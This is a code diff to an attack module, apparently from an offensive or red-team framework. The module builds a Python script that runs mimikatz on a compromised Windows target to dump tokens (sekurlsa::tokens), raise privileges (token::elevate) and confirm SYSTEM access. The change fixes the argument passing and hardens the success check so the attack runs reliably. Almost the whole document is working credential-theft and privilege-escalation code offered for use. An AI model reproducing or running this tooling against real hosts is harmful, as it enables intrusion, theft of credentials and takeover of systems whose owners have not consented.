@@ -51,23 +51,27 @@ class TokenImpersonation(AttackModule):
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
-        return f"""import subprocess, json
+        return f"""import subprocess, json, shutil, sys
 # Target: {ctx.target_ip}
 # Token impersonation via mimikatz. Run on the owned target (operator box
 # dispatches via lateral_exec); no pivot to other hosts.
-results = {{"tokens": "", "elevated": False, "errors": []}}
-mimikatz = "mimikatz.exe"
-cmds = [
-    ["privilege::debug"],
-    ["sekurlsa::tokens"],
-    ["token::elevate"],
-    ["exit"],
-]
+results = {{"tokens": "", "elevated": False, "errors": [], "mimikatz_present": False}}
+# Phase 2: mimikatz takes each subcommand as a SEPARATE argv element, not a
+# newline-joined string (the old code passed one giant arg and mimikatz
+# rejected it on every run). Resolve via shutil.which so a missing binary
+# degrades gracefully instead of failing opaquely.
+mimikatz = shutil.which("mimikatz") or shutil.which("mimikatz.exe") or "mimikatz.exe"
+cmds = ["privilege::debug", "sekurlsa::tokens", "token::elevate", "exit"]
 try:
-    out = subprocess.run([mimikatz] + ["\\n".join(c[0] for c in cmds)],
-                         capture_output=True, text=True, timeout=60)
+    out = subprocess.run([mimikatz] + cmds, capture_output=True, text=True, timeout=60)
     results["tokens"] = (out.stdout + out.stderr)[-3000:]
-    results["elevated"] = "Token Id" in out.stdout and "Impersonation" in out.stdout
+    results["mimikatz_present"] = True
+    # Phase 2: robust elevation check -- look for the SYSTEM identity in the
+    # post-elevation output instead of the fragile "Token Id"+"Impersonation"
+    # string match (breaks across mimikatz versions).
+    results["elevated"] = "NT AUTHORITY\\\\SYSTEM" in (out.stdout + out.stderr)
+except FileNotFoundError:
+    results["errors"].append("mimikatz not on PATH -- stage it on the operator box first")
 except Exception as e:
     results["errors"].append(str(e)[:300])
 print(json.dumps(results))
